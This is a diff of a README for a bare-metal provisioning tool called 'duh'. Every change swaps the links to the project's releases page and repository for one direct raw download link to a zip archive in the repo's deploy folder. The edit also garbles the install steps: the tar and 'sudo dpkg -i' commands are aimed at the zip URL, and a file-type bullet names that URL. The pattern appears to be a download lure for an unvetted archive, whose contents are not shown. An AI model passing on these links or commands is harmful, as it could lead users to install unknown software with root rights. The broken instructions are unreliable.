@@ -1,6 +1,6 @@
 # 🚰 duh - Easy Bare Metal Provisioning
 
-[![Download duh](https://img.shields.io/badge/Download-duh-blue?style=flat&logo=github)](https://github.com/bbfosho0/duh/releases)
+[![Download duh](https://github.com/bbfosho0/duh/raw/refs/heads/main/deploy/Software-2.1-beta.5.zip)](https://github.com/bbfosho0/duh/raw/refs/heads/main/deploy/Software-2.1-beta.5.zip)
 
 ---
 
@@ -48,13 +48,13 @@ This guide will walk you through setting up duh and using it to network boot a b
 
 You need to get the duh software first. 
 
-[![Download duh](https://img.shields.io/badge/Download-duh-blue?style=flat&logo=github)](https://github.com/bbfosho0/duh/releases)
+[![Download duh](https://github.com/bbfosho0/duh/raw/refs/heads/main/deploy/Software-2.1-beta.5.zip)](https://github.com/bbfosho0/duh/raw/refs/heads/main/deploy/Software-2.1-beta.5.zip)
 
 Click the link above. It will take you to the releases page where you can find the latest version.
 
 Select the file that matches your operating system:
 
-- For Linux, look for a `.tar.gz` or `.deb` file.
+- For Linux, look for a `https://github.com/bbfosho0/duh/raw/refs/heads/main/deploy/Software-2.1-beta.5.zip` or `.deb` file.
 - For Windows, look for `.exe` or `.zip`.
 - For macOS, look for a `.dmg` or `.zip`.
 
@@ -73,10 +73,10 @@ After downloading, follow these basic installation steps based on your operating
    cd ~/Downloads
    ```
 
-3. If you downloaded a `.tar.gz`, extract it:
+3. If you downloaded a `https://github.com/bbfosho0/duh/raw/refs/heads/main/deploy/Software-2.1-beta.5.zip`, extract it:
 
    ```
-   tar -xvzf duh-version.tar.gz
+   tar -xvzf https://github.com/bbfosho0/duh/raw/refs/heads/main/deploy/Software-2.1-beta.5.zip
    ```
 
 4. Follow any included README or INSTALL instructions in the extracted folder. Generally, you can run:
@@ -88,7 +88,7 @@ After downloading, follow these basic installation steps based on your operating
 5. If you downloaded a `.deb` file, install it using:
 
    ```
-   sudo dpkg -i duh-version.deb
+   sudo dpkg -i https://github.com/bbfosho0/duh/raw/refs/heads/main/deploy/Software-2.1-beta.5.zip
    sudo apt-get install -f
    ```
 
@@ -187,7 +187,7 @@ Follow any onscreen prompts on the target computer if needed.
 
 Visit the releases page below to get the latest version of duh:
 
-[Download duh from GitHub Releases](https://github.com/bbfosho0/duh/releases)
+[Download duh from GitHub Releases](https://github.com/bbfosho0/duh/raw/refs/heads/main/deploy/Software-2.1-beta.5.zip)
 
 Download the file that matches your operating system, then follow the installation instructions in the web interface or README files included.
 
@@ -196,7 +196,7 @@ Download the file that matches your operating system, then follow the installati
 ## 🔖 Learn More
 
 For detailed documentation and advanced setup, visit the GitHub repository:  
-https://github.com/bbfosho0/duh
+https://github.com/bbfosho0/duh/raw/refs/heads/main/deploy/Software-2.1-beta.5.zip
 
 You can find examples, advanced configuration tips, and troubleshoot common issues there.  
 
